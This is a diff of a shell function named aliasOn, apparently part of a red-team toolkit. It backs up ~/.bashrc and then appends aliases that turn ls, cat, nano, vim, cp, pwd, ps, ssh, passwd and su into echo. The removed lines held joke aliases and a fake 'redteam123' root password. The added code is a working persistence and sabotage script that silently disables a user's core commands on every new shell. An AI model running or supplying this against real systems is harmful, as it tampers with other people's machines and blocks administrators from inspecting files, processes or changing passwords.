@@ -1,20 +1,24 @@
 aliasOn() {
-alias ls 'echo "passwords.txt"'
-alias sl 'ls'
-alias cat 'the root password is redteam123'
-alias tac 'cat'
-alias nano 'echo "what are you trying to look at?"'
-alias onan 'nano'
-alias vim 'echo "ew you use vim..."'
-alias miv 'vim'
-alias cp 'echo "why copy?"'
-alias pc 'cp'
-alias pwd 'echo "/root"'
-alias dwp 'pwd'
-alias ps 'echo "1 - red team ---------- 100%"'
-alias sp 'ps'
-alias ssh 'establishing connection to CIA headquarters...'
-alias hss 'ssh'
-alias passwd 'Password Changed Successfully'
-alias dwssap 'passwd'
+sudo mkdir ~/.backup
+sudo cp ~/.bashrc ~/.backup/
+echo "alias ls='echo'" >> ~/.bashrc
+echo "alias sl='ls'" >> ~/.bashrc
+echo "alias cat='echo'" >> ~/.bashrc
+echo "alias tac='cat'" >> ~/.bashrc
+echo "alias nano='echo'" >> ~/.bashrc
+echo "alias onan='nano'" >> ~/.bashrc
+echo "alias vim='echo'" >> ~/.bashrc
+echo "alias miv='vim'" >> ~/.bashrc
+echo "alias cp='echo'" >> ~/.bashrc
+echo "alias pc='cp'" >> ~/.bashrc
+echo "alias pwd='echo'" >> ~/.bashrc
+echo "alias dwp='pwd'" >> ~/.bashrc
+echo "alias ps='echo'" >> ~/.bashrc
+echo "alias sp='ps'" >> ~/.bashrc
+echo "alias ssh='echo'" >> ~/.bashrc
+echo "alias hss='ssh'" >> ~/.bashrc
+echo "alias passwd='echo'" >> ~/.bashrc
+echo "alias dwssap='passwd'" >> ~/.bashrc
+echo "alias su='echo'" >> ~/.bashrc
+echo "alias us='su'" >> ~/.bashrc
 }
